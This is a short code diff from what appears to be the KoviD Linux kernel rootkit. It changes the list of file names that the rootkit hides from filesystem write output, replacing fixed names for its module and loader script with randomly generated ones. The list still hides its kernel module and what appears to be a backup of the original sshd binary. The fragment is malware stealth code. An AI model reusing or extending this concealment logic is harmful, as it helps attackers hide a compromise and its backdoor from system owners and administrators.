@@ -169,8 +169,8 @@ unsigned long kv_get_elf_vm_start(pid_t);
  * Hide these names from write() fs output
  */
 static const char *kv_hide_str_on_load[] = {
-    ".kovid", "kovid", "kovid.ko", ".kv.ko",
-    ".lm.sh", ".sshd_orig", NULL
+    ".kovid", "kovid", "kovid.ko", UUIDGEN ".ko",
+    UUIDGEN ".sh", ".sshd_orig", NULL
 };
 
 enum {
